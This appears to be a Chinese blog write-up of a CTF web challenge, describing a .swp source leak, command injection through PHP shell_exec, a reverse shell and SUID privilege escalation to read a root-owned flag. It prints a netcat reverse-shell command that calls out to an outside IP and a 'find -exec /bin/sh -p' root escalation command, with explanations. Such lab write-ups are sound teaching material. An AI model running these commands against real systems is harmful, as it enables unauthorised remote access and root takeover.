[{"title":"HCTF 招新赛游戏题 Wp","url":"/2025/12/03/HCTF-Game-Wp/","content":"1、打开题目，游戏题先看源代码\n\n2、源代码中有game.js文件，进入查看，搜索score无果后，在最底部找到了.swp文件的提示，尝试.index.php.swp得到文件\n\n3、在文件中得到下一个地址&#x2F;Nr.php\n\n4、进入看到代码，分析代码后发现这里使用的是shell_exec函数，shell_exec函数需要主动输出，这里显然没有，而且题目提示真正的flag在root目录之下，我们还需要获取root权限才行，但这里又限制掉了find和一些常用的如cat、tac、nl等函数，所以我们选择反弹shell\n\n\n5、我们用tabby连接云服务器，输入nc -lvp 2333对2333端口进行监听，然后传参cmd&#x3D;nc -e &#x2F;bin&#x2F;sh 101.200.30.203 2333\n\n\n6、提权的方式在前面的提示中已经告诉我们了，需要使用SUID进行提权，于是我们对带相应权限的文件进行搜索\n\n7、我们选用find文件进行提权；使用find &#x2F;usr&#x2F;bin&#x2F;find -exec &#x2F;bin&#x2F;sh -p ;命令\n\n8、whoami检查权限为root之后，直接ls &#x2F;root，发现flag之后用tac &#x2F;root&#x2F;flag进行读取\n\n\n\n知识点1、find &#x2F;usr&#x2F;bin&#x2F;find -exec &#x2F;bin&#x2F;sh -p ;命令解释find /usr/bin/find：\t寻找find这个文件-exec：\t\t\t\t当find找到符合条件的文件时，执行指定的命令/bin/sh：\t\t\t承接高权限程序（如带SUID的find）的权限，生成高权限shell-p：\t\t\t\t\t继承保持这个权限\n\n2、.swp.swp文件是 Vim 编辑器生成的临时交换文件，用于在编辑过程中临时保存文件内容，防止意外中断导致未保存的修改丢失；常以.开头用于隐藏文件\n3、shell_exec函数PHP 中用于执行系统命令并获取输出的内置函数，但是与system不同，它需要手动echo才有输出\n4、whoami显示当前执行命令的用户身份\n5、SUID允许普通用户执行某文件时，临时获得该文件所有者的权限，在提权操作很常见\n6、find -perm -u&#x3D;s -type f 2&gt;&#x2F;dev&#x2F;null命令解释-perm：\t\t按照权限筛选文件-u=s：\t\tu代表文件所有者，s代表 SUID 权限，整体意思是 “必须包含所有者的 SUID 权限”-type：\t\t按照文件类型筛选文件f：\t\t\t代表file普通文件2&gt;/dev/null：2代表错误输出，/dev/null是一个文件黑洞，用于丢弃放入这里的的文件\n\n7、nc命令格式：nc [选项] [目标IP] [端口]\n选项：\n-l：监听模式（作为服务器，等待连接）；-p：指定本地端口（配合 -l 使用）；-e：执行命令（连接建立后，将本地 Shell 绑定到连接，常用于反弹 Shell）；-n：不进行 DNS 解析（直接用 IP，加快速度）；-v：显示详细输出（调试用）；-z：扫描模式（不发送数据，仅检测端口是否开放）。\n\n","categories":["CTF"],"tags":["web","wp"]}]